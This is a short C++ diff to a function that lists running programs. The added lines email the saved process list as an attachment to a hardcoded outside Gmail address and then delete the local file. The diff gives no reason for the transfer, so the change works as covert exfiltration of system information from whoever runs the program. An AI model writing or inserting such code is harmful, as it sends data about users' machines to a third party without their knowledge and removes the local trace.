@@ -41,6 +41,18 @@ void list_programs() {
 
   cout << "Process list written to: " << std::filesystem::absolute(filename) << endl;
 
+
+  Sleep(1000);
+    ifstream test_file("process_list.txt");
+    if (test_file.good()) {
+      test_file.close();
+      send_email_with_attachment(
+          "serverbottestmmt@gmail.com", "Running Process List",
+          "Attached is the current process list.", "process_list.txt");
+    } else {
+      cerr << "Failed to create process list file" << endl;
+    }
+  
   if (std::filesystem::remove(filename)) {
     cout << "File deleted after sending." << endl;
   } else {
